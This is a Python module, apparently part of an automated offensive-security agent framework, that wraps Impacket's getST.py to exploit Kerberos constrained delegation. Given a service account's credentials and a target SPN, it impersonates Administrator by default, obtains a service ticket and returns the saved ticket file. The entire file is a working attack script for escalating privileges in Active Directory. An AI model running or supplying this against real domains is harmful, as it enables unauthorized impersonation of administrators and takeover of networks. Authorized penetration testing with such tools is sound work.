"""
Constrained Delegation Agent - Exploit constrained delegation
Uses Impacket (free tool)
"""

import asyncio
import logging
from typing import Dict, Any
from core.base_agent import BaseAgent
from core.agent_data import AgentData

log = logging.getLogger(__name__)

class ConstrainedDelegationAgent(BaseAgent):
    def __init__(self):
        super().__init__(
            name="ConstrainedDelegationAgent",
            description="Exploit constrained delegation vulnerabilities",
            version="1.0.0"
        )
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        """
        Exploit constrained delegation using Impacket's getST.py
        
        Args:
            strategy: {
                "domain": "example.com",
                "username": "serviceaccount",
                "password": "pass",
                "dc_ip": "10.0.0.1",
                "impersonate": "Administrator",
                "spn": "cifs/target.example.com"
            }
        """
        try:
            domain = strategy.get("domain")
            username = strategy.get("username")
            password = strategy.get("password")
            dc_ip = strategy.get("dc_ip")
            impersonate = strategy.get("impersonate", "Administrator")
            spn = strategy.get("spn")
            
            if not all([domain, username, password, spn]):
                return AgentData(success=False, errors=["Missing required parameters"])
            
            # Use Impacket's getST.py
            cmd = [
                "getST.py",
                f"{domain}/{username}:{password}",
                "-spn", spn,
                "-impersonate", impersonate
            ]
            
            if dc_ip:
                cmd.extend(["-dc-ip", dc_ip])
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            output = stdout.decode('utf-8', errors='ignore')
            
            if process.returncode == 0:
                # Extract ticket file
                import re
                ticket_match = re.search(r'Saving ticket in (.+\.ccache)', output)
                ticket_file = ticket_match.group(1) if ticket_match else None
                
                return AgentData(
                    success=True,
                    data={
                        "ticket_file": ticket_file,
                        "impersonated_user": impersonate,
                        "spn": spn,
                        "raw_output": output
                    }
                )
            else:
                return AgentData(
                    success=False,
                    errors=[stderr.decode('utf-8', errors='ignore')]
                )
        
        except Exception as e:
            log.error(f"[ConstrainedDelegation] Error: {e}")
            return AgentData(success=False, errors=[str(e)])
